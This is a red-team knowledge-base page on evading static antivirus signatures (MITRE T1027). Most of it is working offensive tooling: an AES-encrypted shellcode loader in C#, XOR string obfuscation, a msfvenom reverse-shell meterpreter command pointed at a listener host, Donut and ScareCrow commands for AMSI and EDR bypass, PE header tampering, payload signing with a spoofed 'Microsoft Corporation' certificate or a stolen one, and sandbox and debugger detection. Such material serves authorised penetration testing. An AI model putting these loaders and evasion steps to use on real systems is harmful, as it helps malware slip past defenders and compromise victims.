# Signature & Static Evasion

> **MITRE ATT&CK**: Defense Evasion > T1027 - Obfuscated Files or Information
> **Platforms**: Windows, Linux, macOS
> **Required Privileges**: N/A (pre-deployment)
> **OPSEC Risk**: Critical

## Strategic Overview

Signature evasion is the foundational layer -- if your payload is detected statically before execution, runtime evasion is irrelevant. Static detection uses byte patterns, YARA rules, hash databases, import table analysis, entropy analysis, and ML classifiers. For a Red Team Lead, signature evasion is both a pre-engagement preparation task and an ongoing concern. The gold standard is custom tooling: code written from scratch has no existing signatures and forces defenders into behavioral detection, which is far more expensive and error-prone.

## Technical Deep-Dive

### Static Detection Methods (by sophistication)

```
1. Hash-based      --> MD5/SHA256 of entire file (trivial -- change one byte)
2. Byte patterns   --> Specific byte sequences (Mimikatz strings, CS configs)
3. YARA rules      --> Pattern matching with conditions and boolean logic
4. Import hashing  --> Suspicious API combinations (VirtualAlloc + CreateThread)
5. Entropy         --> High-entropy sections suggest encryption/packing
6. PE anomalies    --> Unusual section names, sizes, entry points
7. ML classifiers  --> Feature extraction from PE structure, opcode frequency
```

### Identifying Trigger Bytes

```powershell
# ThreatCheck -- binary search for exact detection trigger in PE files
ThreatCheck.exe -f payload.exe -e Defender
# DefenderCheck -- Defender-specific variant
DefenderCheck.exe payload.exe
# AMSITrigger -- trigger strings in PowerShell scripts
AmsiTrigger_x64.exe -i script.ps1 -f 3
# Modify only the flagged bytes rather than re-obfuscating everything
```

### String Obfuscation

```csharp
// Before (signatured):
string target = "lsass.exe";

// XOR obfuscation with runtime deobfuscation:
byte[] enc = { 0x5F, 0x46, 0x5C, 0x46, 0x46, 0x3D, 0x52, 0x57, 0x52 }; // XOR 0x33
string target = new string(enc.Select(b => (char)(b ^ 0x33)).ToArray());

// Compile-time hash-based API resolution (no strings at all):
// GetProcByHash(hModule, 0xE553A458) instead of GetProcAddress(hModule, "VirtualAlloc")
```

### AES-Encrypted Shellcode Loader

```csharp
using System; using System.Runtime.InteropServices; using System.Security.Cryptography;
class Loader {
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr r, IntPtr p, uint c, IntPtr i);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint m);

    static byte[] Decrypt(byte[] cipher, byte[] key, byte[] iv) {
        using (Aes aes = Aes.Create()) {
            aes.Key = key; aes.IV = iv; aes.Padding = PaddingMode.PKCS7;
            return aes.CreateDecryptor().TransformFinalBlock(cipher, 0, cipher.Length);
        }
    }
    static void Main() {
        byte[] enc = { /* AES-encrypted shellcode */ };
        byte[] key = { /* 32-byte key */ };  byte[] iv = { /* 16-byte IV */ };
        byte[] sc = Decrypt(enc, key, iv);
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, addr, sc.Length);
        WaitForSingleObject(CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero), 0xFFFFFFFF);
    }
}
```

### Custom Tooling -- Language Selection

| Language | Advantages | Disadvantages |
|----------|-----------|---------------|
| C/C++ | Full API access, small binaries | Complex, well-understood by AV |
| C# | .NET ecosystem, reflection, easy dev | .NET metadata reveals intent |
| Rust | No runtime, cross-compile, fast | Steep learning curve |
| Nim | Compiles to C, Python-like syntax | Small community |
| Go | Cross-compile, easy concurrency | Large binaries, Go runtime |

### Shellcode Generation and Conversion

```bash
# msfvenom (heavily signatured -- must encrypt output)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f raw -o payload.bin
# Donut -- convert PE/.NET assembly to position-independent shellcode
donut.exe -f payload.exe -o payload.bin -a 2 -e 3   # x64, AMSI bypass, encrypted
# ScareCrow -- automated loader generation with EDR evasion
ScareCrow -I payload.bin -Loader dll -domain microsoft.com
```

### PE Manipulation

```python
import pefile
pe = pefile.PE("payload.exe")
pe.FILE_HEADER.TimeDateStamp = 0x5F3E2D1C           # Blend compilation timestamp
pe.OPTIONAL_HEADER.CheckSum = pe.generate_checksum() # Fix checksum
pe.write("modified_payload.exe")                     # Rich header, version info also modifiable
```

### Code Signing

```powershell
# Self-signed (low trust but bypasses some checks)
$cert = New-SelfSignedCertificate -DnsName "Microsoft Corporation" `
    -CertStoreLocation "Cert:\CurrentUser\My" -Type CodeSigningCert
Set-AuthenticodeSignature -FilePath payload.exe -Certificate $cert
# Legitimate signing (with stolen/purchased cert)
signtool sign /f cert.pfx /p password /t http://timestamp.digicert.com payload.exe
```

### Anti-Analysis / Sandbox Evasion

```csharp
if (Environment.MachineName.Length < 4) return;                   // Short names = sandbox
if (DateTime.Now - Process.GetCurrentProcess().StartTime < TimeSpan.FromMinutes(2))
    Thread.Sleep(120000);                                          // Exceed sandbox timeout
if (System.Windows.Forms.SystemInformation.ScreenCount < 1) return;
string[] badProcs = {"wireshark", "procmon", "x64dbg", "ida"};
if (Process.GetProcesses().Any(p => badProcs.Contains(p.ProcessName.ToLower()))) return;
```

## Detection & Evasion

| Indicator | Source | Notes |
|-----------|--------|-------|
| YARA rule matches | AV/EDR static engine | Byte pattern detection |
| High entropy sections | PE analysis | Encrypted/packed content indicator |
| Suspicious imports | Import table analysis | VirtualAlloc + CreateThread combo |
| Missing PE metadata | Static analysis | Stripped version info, odd timestamps |
| Unsigned binaries in sensitive paths | Code integrity | Unexpected executables |
| Sandbox evasion behavior | Behavioral sandbox | Sleep/env checks before payload |

**Evasion Guidance**: Identify exact signatures with ThreatCheck before modifying. Custom tooling over obfuscation of known tools. Encrypt shellcode, strings, and configs with runtime decryption. Avoid known packers (UPX/Themida/VMProtect are detection triggers themselves). Sign payloads when possible. **Never upload to VirusTotal** -- it shares samples with all vendors immediately. Test locally against the target's specific AV product.

## Cross-References

- [AMSI Bypass](amsi-bypass.md) -- AMSI performs runtime content scanning complementing static signatures
- [AV/EDR Evasion](av-edr-evasion.md) -- static evasion is prerequisite to runtime evasion
- [AppLocker Bypass](applocker-bypass.md) -- application whitelisting is another static check
- [Network Evasion](network-evasion.md) -- network signatures parallel host-based signatures

## References

- ThreatCheck: https://github.com/rasta-mouse/ThreatCheck
- Donut: https://github.com/TheWover/donut
- ScareCrow: https://github.com/optiv/ScareCrow
- YARA: https://yara.readthedocs.io/
- Offensive Nim: https://github.com/byt3bl33d3r/OffensiveNim
